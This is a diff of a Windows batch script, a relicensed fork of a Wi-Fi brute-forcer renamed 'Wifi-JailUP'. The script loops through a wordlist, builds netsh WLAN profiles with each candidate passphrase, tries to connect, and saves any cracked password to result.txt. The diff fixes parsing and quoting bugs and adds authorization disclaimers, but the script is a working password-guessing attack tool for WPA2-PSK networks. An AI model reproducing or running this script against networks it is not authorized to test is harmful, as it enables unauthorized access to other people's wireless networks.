@@ -1,25 +1,37 @@
 @echo off
-:: Batch Wi-Fi Brute Forcer - Developed By TechnicalUserX
-:: Please refer to https://github.com/TechnicalUserX for more projects
+:: Wifi-JailUP v1.0.0 - Windows netsh WPA2-PSK passphrase tester
+:: Copyright (C) 2025-2026 sanguirIS
+::
+:: This program is free software: you can redistribute it and/or modify
+:: it under the terms of the GNU General Public License as published by
+:: the Free Software Foundation, either version 3 of the License, or
+:: (at your option) any later version.
+::
+:: This program is distributed in the hope that it will be useful,
+:: but WITHOUT ANY WARRANTY; without even the implied warranty of
+:: MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+:: GNU General Public License for more details.
+::
+:: You should have received a copy of the GNU General Public License
+:: along with this program.  If not, see <https://www.gnu.org/licenses/>.
+::
+:: Based on Batch Wi-Fi Brute Forcer by TechnicalUserX
+:: https://github.com/TechnicalUserX/batch_wifi_brute_forcer
+:: Original work published under the MIT License.
 
-:: This program is created to be a proof of concept that it is possible
-:: to write a working Wi-Fi attack tool with Batchfiles since there 
-:: are countless examples on the internet that claims to be legit
-:: hacking tools, working on CMD. While this tool does not claim
-:: a 100% success ratio, it still works if the target Wi-Fi has
-:: weak password. :)
-
-:: There is already a wordlist file in the repository but you are
-:: free to use your own wordlists.
+:: Educational proof of concept: a CMD script can drive netsh wlan
+:: profile add/connect and observe interface state. Only test networks
+:: you own or have permission to assess. Weak passphrases are the only
+:: ones this online association loop can ever confirm.
 
 cls
 setlocal enabledelayedexpansion
-title Batch Wi-Fi Brute Forcer
+title Wifi-JailUP v1.0.0
 color 0f
 
 cd /D "%~dp0"
 
-if not exist importwifi.xml (
+if not exist "importwifi.xml" (
     call :exit_fatal "importwifi.xml is missing. Exiting..."
 )
 
@@ -33,7 +45,7 @@ set wifi_target=not_defined
 
 set attack_counter_option=0
 
-if not exist wordlist.txt (
+if not exist "wordlist.txt" (
     set wordlist_file=not_defined
 ) else (
     set wordlist_file=wordlist.txt
@@ -52,23 +64,23 @@ goto :eof
     set interface_temp_index=-1
     set interface_number=0
 
-    for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L "Name Description Physical"') do (
-        if "%%c"=="Wi-Fi" (
+    for /f "tokens=1-4*" %%a in ('netsh wlan show interfaces ^| findstr /I /L "Name Description Physical"') do (
+        if /I "%%a"=="Name" (
             set /a interface_temp_index=!interface_temp_index!+1
             if "%%d"=="" (
                 set interface[!interface_temp_index!]_id=%%c
             ) else (
-                set interface[!interface_temp_index!]_id=%%c %%d
+                set interface[!interface_temp_index!]_id=%%c %%d %%e
             )
+            call :trim_var interface[!interface_temp_index!]_id
         )
-        if %%a==Description (
-            set interface[!interface_temp_index!]_description=%%c %%d
+        if /I "%%a"=="Description" (
+            set interface[!interface_temp_index!]_description=%%c %%d %%e
+            call :trim_var interface[!interface_temp_index!]_description
         )
-        if %%a==Physical (
+        if /I "%%a"=="Physical" (
             set interface[!interface_temp_index!]_mac=%%d
-        )	
-
-
+        )
     )
 
     set /a interface_number=!interface_temp_index!+1
@@ -294,7 +306,7 @@ goto :eof
 :mainmenu
     cls
     echo.
-    call :color_echo . cyan "Batch Wi-Fi Brute Forcer"
+    call :color_echo . cyan "Wifi-JailUP v1.0.0"
     echo.
     echo.
     call :color_echo . magenta "   Interface : "
@@ -314,38 +326,37 @@ goto :eof
     call :program_prompt
     echo.
 
-    if "!program_prompt_input!" equ "scan" (
+    if /I "!program_prompt_input!" equ "scan" (
         call :scan
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "interface" (
+    if /I "!program_prompt_input!" equ "interface" (
         call :interface_init
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "attack" (
+    if /I "!program_prompt_input!" equ "attack" (
         call :attack
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "help" (
+    if /I "!program_prompt_input!" equ "help" (
         call :help
         goto :mainmenu
     )
 
-
-    if "!program_prompt_input!" equ "wordlist" (
+    if /I "!program_prompt_input!" equ "wordlist" (
         call :wordlist
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "counter" (
+    if /I "!program_prompt_input!" equ "counter" (
         call :counter
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "exit" (
+    if /I "!program_prompt_input!" equ "exit" (
         exit
     )
 
@@ -355,8 +366,6 @@ goto :mainmenu
 
 :scan
     cls
-    netsh wlan disconnect interface="%interface_id%" > nul
-
     if "!interface_id!" equ "not_defined" (
         call :color_echo . red "You have to select an interface to perform a scan"
         set wifi_target=not_defined
@@ -365,6 +374,8 @@ goto :mainmenu
         pause
         goto :eof
     )
+
+    netsh wlan disconnect interface="!interface_id!" > nul
 
     echo.
     call :color_echo . cyan "Possible Wi-Fi Networks"
@@ -378,10 +389,6 @@ goto :mainmenu
         if "%%a" equ "SSID" (
             set /a wifi_index=!wifi_index!+1
             set wifi[!wifi_index!]_ssid=%%d
-
-            if "!current_ssid!"==""(
-                "set current_ssid=Hidden_Network"
-            )
         )
 
         if "%%a" equ "Signal" (
@@ -419,6 +426,11 @@ goto :mainmenu
     )
     if !program_prompt_input! leq !wifi_index! (
             if !program_prompt_input! geq 0 (
+            if "!wifi[%program_prompt_input%]_ssid!" equ "" (
+                call :color_echo . red "Hidden / unnamed networks cannot be selected"
+                timeout /t 3 >nul
+                goto :eof
+            )
             set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
             goto :eof
         )
@@ -483,20 +495,22 @@ goto :eof
 
     :: Prepare ssid import
     del /Q /F importwifi_prepared.xml 2>nul
-    for /f "tokens=*" %%a in ( importwifi.xml ) do (
+    del /Q /F importwifi_attempt.xml 2>nul
+    for /f "usebackq tokens=*" %%a in ( "importwifi.xml" ) do (
         set variable=%%a
         echo !variable:changethistitle=%wifi_target%!>>importwifi_prepared.xml
     )
 
     set password_count=0
     
-    for /f "tokens=1" %%a in ( !wordlist_file! ) do (
+    for /f "usebackq tokens=* delims=" %%a in ( "!wordlist_file!" ) do (
 
+        if not "%%a"=="" (
         set /a password_count=!password_count!+1
         set password=%%a
-		set temp_auth_num=0
+        set temp_auth_num=0
         call :prepare_attempt "!password!"
-        netsh wlan add profile filename=importwifi_attempt.xml >nul
+        netsh wlan add profile filename="importwifi_attempt.xml" >nul
         cls
         echo.
         call :color_echo . cyan "Attacking"
@@ -521,6 +535,7 @@ goto :eof
         if "!attack_finalize!" equ "true" (
             set attack_finalize=false
             goto :eof
+        )
         )
 
     )
@@ -561,7 +576,7 @@ goto :eof
     echo.
     echo.
 
-    echo Batch Wi-Fi Brute Forcer Result>>result.txt
+    echo Wifi-JailUP Result>>result.txt
     echo Target     : !wifi_target!>>result.txt
     echo At attempt : !password_count!>>result.txt
     echo Password   : !password!>>result.txt
@@ -638,14 +653,16 @@ goto :eof
 	echo  - wordlist         : Provide a wordlist file
 	echo  - scan             : Performs a WI-FI scan
 	echo  - interface        : Open Interface Management
-	echo  - attack           : Attacks selected WI-FI
-	echo  - counter          : Sets the attack counter
+	echo  - attack           : Test the selected WI-FI
+	echo  - counter          : Sets the attempt counter
 	echo  - exit             : Close the program
 	echo.
-	echo  For more information, please refer to "README.md".
+	echo  Wifi-JailUP v1.0.0  Copyright (C) 2025-2026 sanguirIS
+	echo  Licensed under GNU GPL-3.0. No warranty.
+	echo  Use only on networks you are authorized to test.
 	echo.
-	echo  More projects from TechnicalUserX:
-	echo  https://github.com/TechnicalUserX
+	echo  For more information, see README.md
+	echo  Upstream: https://github.com/TechnicalUserX/batch_wifi_brute_forcer
 	echo.
 	echo.
 	echo Press any key to continue...
@@ -664,11 +681,11 @@ goto :eof
     echo.
     call :program_prompt
     echo.
-    if not exist !program_prompt_input! (
+    if not exist "!program_prompt_input!" (
         call :color_echo . red "Provided path does not resolve to a file"
         timeout /t 2 >nul
     ) else (
-        set wordlist_file=!program_prompt_input!
+        set "wordlist_file=!program_prompt_input!"
         goto :eof
     )
 goto :eof
@@ -699,10 +716,20 @@ goto :eof
 
 
 :prepare_attempt
-	for /f "tokens=*" %%x in ( importwifi_prepared.xml ) do (
-		set code=%%x
-		echo !code:changethiskey=%~1!>>importwifi_attempt.xml
+    del /Q /F importwifi_attempt.xml 2>nul
+    for /f "usebackq tokens=*" %%x in ( "importwifi_prepared.xml" ) do (
+        set code=%%x
+        echo !code:changethiskey=%~1!>>importwifi_attempt.xml
     )
+goto :eof
+
+
+:trim_var
+    set "trim_name=%~1"
+    set "trim_value=!%trim_name%!"
+    for /f "tokens=* delims= " %%z in ("!trim_value!") do set "trim_value=%%z"
+    for /l %%i in (1,1,8) do if "!trim_value:~-1!"==" " set "trim_value=!trim_value:~0,-1!"
+    set "!trim_name!=!trim_value!"
 goto :eof
 
 
@@ -721,6 +748,10 @@ goto :eof
         )
         
         if "!interface_id!"=="%%c %%d" (
+            set interface_state_check=true
+        )
+
+        if "!interface_id!"=="%%c %%d %%e" (
             set interface_state_check=true
         )
     )
